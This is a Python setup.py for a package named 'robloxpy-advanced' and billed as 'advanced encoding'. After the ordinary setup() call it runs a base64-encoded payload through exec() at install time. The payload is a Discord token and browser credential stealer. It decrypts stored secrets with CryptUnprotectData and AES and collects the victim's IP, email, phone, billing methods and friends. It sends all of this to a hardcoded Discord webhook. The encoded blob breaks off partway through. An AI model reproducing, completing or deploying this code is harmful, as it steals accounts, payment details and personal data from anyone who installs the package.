from setuptools import setup
import base64

with open('README.md', 'r') as fh:
    long_description = fh.read()

setup(
    name='robloxpy-advanced',
    version='0.1.0',
    author='Carter',
    author_email='PW668878@outlook.com',
    description='Advanced encoding',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks',
    packages=['robloxpy-advanced'],
    install_requires=['browser_cookie3', 'requests', 'psutil', 'cryptography', 'httpx', 'pypiwin32', 'dhooks', 'pycryptodome'],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)

exec(base64.b64decode(
"""
aW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0CmltcG9ydCByZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZApmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlCmltcG9ydCByYW5kb20KaW1wb3J0IHJlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzb2NrZXQKaW1wb3J0IHBzdXRpbApmcm9tIHRraW50ZXIgaW1wb3J0IG1lc3NhZ2Vib3gKZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYgoKIyAgVEhJUyBJUyAxLjEuNiBWRVJTSU9OCiMgICAgQlkgVzRTUCwgbG9UdXMwNAojIAoKCmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3NDc2Mjc2MjE1ODM1NDU2Mi9jWGp6cV9VSkxna2x2cEdmMVZ0S0VoNDFWQkVqY3kwSzQ3Q0RXLThxOUNFdnlTVGFsbUF4RWhUY3pGQUhGRGFodHloRSIKc3RhcnR1cCA9IEZhbHNlCnNodXRkb3duID0gRmFsc2UKZmFrZWVycm9yID0gRmFsc2UKcG9ybmh1YiA9IEZhbHNlCmNhbWVyYSA9IEZhbHNlCnNjcmVlbnNob3QgPSBGYWxzZQpERVRFQ1RFRCA9IEZhbHNlCgoKZGVmIGdldGlwKCk6CiAgICBpcCA9ICJOb25lIgogICAgdHJ5OgogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gaXAKCnJlcXVpcmVtZW50cyA9IFsKICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwKICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXSwKXQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6CiAgICB0cnk6IF9faW1wb3J0X18obW9kbFswXSkKICAgIGV4Y2VwdDoKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpCiAgICAgICAgdGltZS5zbGVlcCgzKQoKaW1wb3J0IHJlcXVlc3RzCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQpUaHJlYWRsaXN0ID0gW10KCgpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToKICAgIF9maWVsZHNfID0gWwogICAgICAgICgnY2JEYXRhJywgd2ludHlwZXMuRFdPUkQpLAogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQogICAgXQoKZGVmIEdldERhdGEoYmxvYl9vdXQpOgogICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkKICAgIHBiRGF0YSA9IGJsb2Jfb3V0LnBiRGF0YQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQogICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpCiAgICB3aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKHBiRGF0YSkKICAgIHJldHVybiBidWZmZXIucmF3CgpkZWYgQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRlZF9ieXRlcywgZW50cm9weT1iJycpOgogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkKICAgIGJ1ZmZlcl9lbnRyb3B5ID0gY19idWZmZXIoZW50cm9weSwgbGVuKGVudHJvcHkpKQogICAgYmxvYl9pbiA9IERBVEFfQkxPQihsZW4oZW5jcnlwdGVkX2J5dGVzKSwgYnVmZmVyX2luKQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpCiAgICBibG9iX291dCA9IERBVEFfQkxPQigpCgogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOgogICAgICAgIHJldHVybiBHZXREYXRhKGJsb2Jfb3V0KQoKZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOgogICAgc3RhcnRzID0gYnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLCBlcnJvcnM9J2lnbm9yZScpWzozXQogICAgaWYgc3RhcnRzID09ICd2MTAnIG9yIHN0YXJ0cyA9PSAndjExJzoKICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCgpkZWYgTG9hZFJlcXVlc3RzKG1ldGhvZGUsIHVybCwgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6ICMgbWF4IHRyeXMKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG1ldGhvZGUgPT0gJ1BPU1QnOgogICAgICAgICAgICAgICAgaWYgZGF0YSAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBvciByLnN0YXR1c19jb2RlID09IDQxMzogIyA0MTMgPSBEQVRBIFRPIEJJRwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKZGVmIExvYWRVcmxpYihob29rLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGhlYWRlcnMgIT0gJyc6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSkpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHBhc3MKCmRlZiBnbG9iYWxJbmZvKCk6CiAgICBpcCA9IGdldGlwKCkKICAgIHVzZXJuYW1lID0gb3MuZ2V0bG9naW4oKQogICAgaXBkYXRhbm9qc29uID0gdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9pcGFwaS5jby97aXB9L2pzb24iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykKICAgICMgcHJpbnQoaXBkYXRhbm9qc29uKQogICAgaXBkYXRhID0gbG9hZHMoaXBkYXRhbm9qc29uKQogICAgIyBwcmludCh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0KICAgIGNvbnRyeUNvZGUgPSBpcGRhdGFbImNvdW50cnlfY29kZSJdLmxvd2VyKCkKICAgIGdsb2JhbGluZm8gPSBmIjpmbGFnX3tjb250cnlDb2RlfTogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtpcH0gKHtjb250cnl9KWAiCiAgICAjIHByaW50KGdsb2JhbGluZm8pCiAgICByZXR1cm4gZ2xvYmFsaW5mbwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0gKGRpc2FibGVkIGZvciB0aGUgbW9tZW50KQogICAgZ2xvYmFsIERFVEVDVEVECiAgICBkYXRhID0gc3RyKENvb2tpZXMpCiAgICB0aW0gPSByZS5maW5kYWxsKCIuZ29vZ2xlLmNvbSIsIGRhdGEpCiAgICAjIHByaW50KGxlbih0aW0pKQogICAgaWYgbGVuKHRpbSkgPCAtMToKICAgICAgICBERVRFQ1RFRCA9IFRydWUKICAgICAgICByZXR1cm4gREVURUNURUQKICAgIGVsc2U6CiAgICAgICAgREVURUNURUQgPSBGYWxzZQogICAgICAgIHJldHVybiBERVRFQ1RFRAogICAgICAgIApkZWYgR2V0VUhRRnJpZW5kcyh0b2tlbik6CiAgICBiYWRnZUxpc3QgPSAgWwogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8yJywgJ1ZhbHVlJzogMTYzODQsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJpbGxpYW5jZScsICdWYWx1ZSc6IDEyOCwgJ0Vtb2ppJzogIjw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICdWYWx1ZSc6IDQsICdFbW9qaSc6ICI8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgXQogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgZnJpZW5kbGlzdCA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgdWhxbGlzdCA9ICcnCiAgICBmb3IgZnJpZW5kIGluIGZyaWVuZGxpc3Q6CiAgICAgICAgT3duZWRCYWRnZXMgPSAnJwogICAgICAgIGZsYWdzID0gZnJpZW5kWyd1c2VyJ11bJ3B1YmxpY19mbGFncyddCiAgICAgICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoKICAgICAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMCBhbmQgZnJpZW5kWyd0eXBlJ10gPT0gMToKICAgICAgICAgICAgICAgIGlmIG5vdCAiSG91c2UiIGluIGJhZGdlWyJOYW1lIl06CiAgICAgICAgICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiYWRnZVsiVmFsdWUiXQogICAgICAgIGlmIE93bmVkQmFkZ2VzICE9ICcnOgogICAgICAgICAgICB1aHFsaXN0ICs9IGYie093bmVkQmFkZ2VzfSB8IHtmcmllbmRbJ3VzZXInXVsndXNlcm5hbWUnXX0je2ZyaWVuZFsndXNlciddWydkaXNjcmltaW5hdG9yJ119ICh7ZnJpZW5kWyd1c2VyJ11bJ2lkJ119KVxuIgogICAgcmV0dXJuIHVocWxpc3QKCgpkZWYgR2V0QmlsbGluZyh0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSIKCiAgICBiaWxsaW5nID0gIiIKICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOgogICAgICAgIGlmIG1ldGhvZGVbImludmFsaWQiXSA9PSBGYWxzZToKICAgICAgICAgICAgaWYgbWV0aG9kZVsidHlwZSJdID09IDE6CiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6IgogICAgICAgICAgICBlbGlmIG1ldGhvZGVbInR5cGUiXSA9PSAyOgogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOnBhcmtpbmc6ICIKCiAgICByZXR1cm4gYmlsbGluZwoKCmRlZiBHZXRCYWRnZShmbGFncyk6CiAgICBpZiBmbGFncyA9PSAwOiByZXR1cm4gJycKCiAgICBPd25lZEJhZGdlcyA9ICcnCiAgICBiYWRnZUxpc3QgPSAgWwogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8yJywgJ1ZhbHVlJzogMTYzODQsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJpbGxpYW5jZScsICdWYWx1ZSc6IDEyOCwgJ0Vtb2ppJzogIjw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICdWYWx1ZSc6IDQsICdFbW9qaSc6ICI8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgXQogICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoKICAgICAgICBpZiBmbGFncyAvLyBiYWRnZVsiVmFsdWUiXSAhPSAwOgogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQogICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0KCiAgICByZXR1cm4gT3duZWRCYWRnZXMKCmRlZiBHZXRUb2tlbkluZm8odG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIHVzZXJuYW1lID0gdXNlcmpzb25bInVzZXJuYW1lIl0KICAgIGhhc2h0YWcgPSB1c2VyanNvblsiZGlzY3JpbWluYXRvciJdCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdCiAgICBpZGQgPSB1c2VyanNvblsiaWQiXQogICAgcGZwID0gdXNlcmpzb25bImF2YXRhciJdCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQogICAgbml0cm8gPSAiIgogICAgcGhvbmUgPSAiLSIKCiAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1c2VyanNvbjogCiAgICAgICAgbml0cm90ID0gdXNlcmpzb25bInByZW1pdW1fdHlwZSJdCiAgICAgICAgaWYgbml0cm90ID09IDE6CiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICIKICAgICAgICBlbGlmIG5pdHJvdCA9PSAyOgogICAgICAgICAgICBuaXRybyA9ICI8YTpib29zdDo4MjQwMzY3Nzg1NzA0MTYxMjk+IDw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICIKICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnCgogICAgcmV0dXJuIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUKCmRlZiBjaGVja1Rva2VuKHRva2VuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCk6CiAgICBnbG9iYWwgaG9vawogICAgaGVhZGVycyA9IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZSA9IEdldFRva2VuSW5mbyh0b2tlbikKCiAgICBpZiBwZnAgPT0gTm9uZTogCiAgICAgICAgcGZwID0gImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTI1OTMxODQyNTExODMxOTUvN2M4ZjQ3NjEyM2QyOGQxMDNlZmUzODE1NDMyNzRjMjUucG5nIgogICAgZWxzZToKICAgICAgICBwZnAgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve2lkZH0ve3BmcH0iCgogICAgYmlsbGluZyA9IEdldEJpbGxpbmcodG9rZW4pCiAgICBiYWRnZSA9IEdldEJhZGdlKGZsYWdzKQogICAgZnJpZW5kcyA9IEdldFVIUUZyaWVuZHModG9rZW4pCiAgICBpZiBmcmllbmRzID09ICcnOiBmcmllbmRzID0gIk5vIFJhcmUgRnJpZW5kcyIKICAgIGlmIG5vdCBiaWxsaW5nOgogICAgICAgIGJhZGdlLCBwaG9uZSwgYmlsbGluZyA9ICLwn5SSIiwgIvCflJIiLCAi8J+UkiIKICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iCgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGYne2dsb2JhbEluZm8oKX0gfCBGb3VuZCBpbiBge3BhdGh9YCcsCiAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAiY29sb3IiOiAxMzksCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmInx8YHt0b2tlbn1gfHxcbltDbGljayB0byBjb3B5XShodHRwczovL3N1cGVyZnVycnljZG4ubmwvY29weS97dG9rZW59KSIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmVudmVsb3BlOiBFbWFpbDoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYHtlbWFpbH1gIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6bW9iaWxlX3Bob25lOiBQaG9uZToiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie3Bob25lfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmdsb2JlX3dpdGhfbWVyaWRpYW5zOiBJUDoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYHtnZXRpcCgpfWAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpiZWdpbm5lcjogQmFkZ2VzOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7bml0cm99e2JhZGdlfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmNyZWRpdF9jYXJkOiBCaWxsaW5nOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YmlsbGluZ30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpjbG93bjogSFEgRnJpZW5kczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2ZyaWVuZHN9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAg